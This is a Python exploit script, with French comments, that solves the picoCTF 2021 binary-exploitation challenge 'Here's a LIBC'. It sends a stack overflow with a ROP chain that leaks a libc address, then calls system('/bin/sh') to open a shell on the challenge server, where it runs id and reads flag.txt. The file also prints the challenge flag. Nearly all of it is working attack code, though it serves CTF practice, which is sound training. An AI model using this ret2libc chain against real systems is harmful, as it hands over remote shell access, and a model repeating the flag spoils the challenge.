# 179 - Here's a LIBC  (Binary Exploitation, picoCTF 2021)
# Flag: academy{1_l0v3_sm4sh_st4cking_a768fad93c216715}
# Write-up: ../../../writeups/binary-exploitation/179-here-s-a-libc.md
# Script exact utilise pour produire le flag.
#
import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 15996
PUTS_GOT = 0x601018
PUTS_PLT = 0x400540
DO_STUFF = 0x4006d8
POP_RDI = 0x400913
RET = 0x40052E
OFF = 0x80 + 8

# offsets libc
LIBC_PUTS = 0x80a30
LIBC_SYSTEM = 0x4f4e0

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(8)
time.sleep(0.8)
try:
    print("banner:", s.recv(8192).decode("utf-8", "replace")[:200])
except Exception:
    pass
p1 = b"A" * OFF + struct.pack("<Q", POP_RDI) + struct.pack("<Q", PUTS_GOT) + struct.pack("<Q", PUTS_PLT) + struct.pack("<Q", DO_STUFF)
print("payload1 len:", len(p1))
s.sendall(p1 + b"\n")
time.sleep(1.2)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > 4000:
            break
except Exception:
    pass
print("recu:", len(data))
print(data[:300])
# trouver l'adresse de puts dans la reponse
idx = data.find(b"\n")
# le leak est un pointeur 6 octets
m = re.search(rb"(\x7f[\x00-\xff]{5})", data)
leak = None
for i in range(len(data) - 5):
    cand = data[i:i + 6]
    v = int.from_bytes(cand, "little")
    if 0x7f0000000000 <= v <= 0x7fffffffffff:
        leak = v
        break
print("leak:", hex(leak) if leak else None)
if not leak:
    # essayer de lire plus
    try:
        s.settimeout(3)
        more = s.recv(4096)
        data += more
        for i in range(len(data) - 5):
            cand = data[i:i + 6]
            v = int.from_bytes(cand, "little")
            if 0x7f0000000000 <= v <= 0x7fffffffffff:
                leak = v
                break
        print("leak apres:", hex(leak) if leak else None)
    except Exception:
        pass
if not leak:
    sys.exit(1)
libc_base = leak - LIBC_PUTS
system = libc_base + LIBC_SYSTEM
print("libc_base:", hex(libc_base), "system:", hex(system))
# /bin/sh dans la libc
r = __import__("subprocess").run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
                                  "cd /tmp/cylab_bin && python3 -c \"d=open('179_libc.so.6','rb').read(); print(d.find(b'/bin/sh'))\""],
                                 capture_output=True, text=True)
off_binsh = int((r.stdout or "0").strip() or 0)
print("binsh off:", hex(off_binsh))
binsh = libc_base + off_binsh
p2 = b"A" * OFF + struct.pack("<Q", RET) + struct.pack("<Q", POP_RDI) + struct.pack("<Q", binsh) + struct.pack("<Q", system)
s.sendall(p2 + b"\n")
time.sleep(1.2)
s.sendall(b"echo SHELL_OK; id; cat flag.txt; ls\n")
time.sleep(1.5)
out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:1200])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
if m:
    print("FLAG:", m.group(0))
s.close()
